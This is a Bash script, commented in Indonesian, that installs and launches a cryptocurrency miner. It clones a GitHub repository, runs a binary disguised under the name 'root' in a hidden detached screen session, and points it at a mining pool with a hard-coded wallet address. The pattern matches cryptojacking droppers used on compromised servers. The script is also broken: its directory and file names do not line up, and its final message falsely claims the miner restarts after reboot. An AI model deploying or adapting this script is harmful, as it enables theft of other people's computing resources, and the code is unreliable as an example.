#!/bin/bash

echo "📦 Menginstal dependensi..."
apt-get update && apt-get install -y screen wget tar git

echo "📁 Menyimpan skrip mining ke /root/hellminer.sh..."
cat << 'EOF' > /root/hellminer.sh
#!/bin/bash

cd /root || exit

# Download dan siapkan miner jika belum ada
if [ ! -f yui56/hellminer ]; then
  echo "⬇️ Mengunduh dan menyiapkan hellminer_linux64..."
  cd yui56 || exit
  git clone https://github.com/root6789/home.git
  chmod +x root
else
  cd yui56 || exit
fi

# Jalankan mining jika screen belum aktif
if screen -list | grep -q amirul3; then
  echo "⚠️  Screen 'amirul3' sudah berjalan, lewati..."
else
  echo "▶ Menjalankan mining di screen 'amirul3'..."
  screen -dmS amirul3 bash -c '
    while true; do
      ./root -c stratum+ssl://usw.vipor.net:5140 -u RQdUotwPueFvRY5xKfn6REsMUsBdhhmqdq.asia -p x --threads 7
      sleep 2
    done
  '
fi
EOF

chmod +x /root/hellminer.sh

echo "🚀 Menjalankan miner sekarang..."
bash /root/hellminer.sh

echo "✅ Siap! Mining aktif sekarang & otomatis jalan setelah reboot."
